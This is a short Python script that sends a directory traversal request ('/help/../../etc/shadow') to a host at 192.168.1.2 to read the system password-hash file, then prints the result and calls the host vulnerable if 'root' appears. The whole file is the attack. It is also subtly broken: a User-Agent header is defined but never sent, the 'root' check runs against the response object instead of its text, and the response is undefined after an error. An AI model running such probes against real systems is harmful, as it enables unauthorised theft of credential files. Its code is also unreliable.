#!/usr/bin/python3

import urllib.request 
url = 'http://192.168.1.2/help/../../etc/shadow'
user_agent = 'Mozilla/5.0 (Windows NT 6.1; WIN64; x64)'
header = {'User-Agent' : user_agent}
#req = Request(url)
try:
    response = urllib.request.urlopen(url)
    print(response.read())
except urllib.error.HTTPError as e:
    print(e)
except urllib.error.URLError  as u:
    print(u)


if ("root" in response):
    print(url, " is vulnerable")
else:
    print("ok")
